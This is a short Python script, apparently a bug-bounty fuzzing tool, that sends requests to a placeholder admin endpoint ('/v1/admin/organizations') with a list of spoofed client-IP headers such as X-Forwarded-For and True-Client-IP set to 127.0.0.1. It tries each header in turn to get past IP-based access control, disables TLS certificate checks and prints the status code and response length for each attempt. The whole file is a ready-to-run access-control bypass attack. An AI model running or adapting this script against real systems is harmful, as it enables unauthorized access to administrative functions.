import httpx
import warnings

warnings.filterwarnings("ignore")

TARGET_URL = "https://api.yourtarget.com/v1/admin/organizations"

# Trusted IP spoofing header combinations
IP_SPOOF_MUTATIONS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"}
]

def fuzz_ip_spoof():
    client = httpx.Client(verify=False, timeout=5.0)
    
    print("[*] Fuzzing trusted IP spoofing headers with internal host routing...\n")
    
    for mutation in IP_SPOOF_MUTATIONS:
        headers = {
            "Host": "yourtarget.com",
            "Authorization": "Bearer test_token_org_alpha_xyz",
            "User-Agent": "BugX-IPSpoofFuzzer/1.0"
        }
        headers.update(mutation)
        
        try:
            res = client.get(TARGET_URL, headers=headers)
            header_name = list(mutation.keys())[0]
            header_val = list(mutation.values())[0]
            print(f"[+] Header: {header_name:22s} | Val: {header_val:15s} -> Status: {res.status_code} | Length: {len(res.text)}")
        except httpx.RequestError as e:
            print(f"[!] Error: {e}")

    client.close()

if __name__ == "__main__":
    fuzz_ip_spoof()
